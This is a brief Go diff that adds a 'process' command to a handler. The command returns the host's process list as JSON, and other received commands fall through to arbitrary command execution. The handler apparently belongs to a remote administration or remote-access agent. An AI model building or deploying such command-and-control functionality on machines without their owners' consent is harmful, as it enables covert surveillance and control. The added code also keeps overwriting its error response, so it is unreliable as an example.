@@ -275,6 +275,13 @@ func (h *Handler) HandleCommand() {
 					response = encode.StringToByte(err.Error())
 				}
 			}
+		case "process":
+			process, err := h.Services.Information.GetProcessList()
+			if err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			}
+			response = encode.StringToByte(encode.PrettyJson(process))
 		default:
 			response, err = h.RunCommand(request.Command)
 			if err != nil {
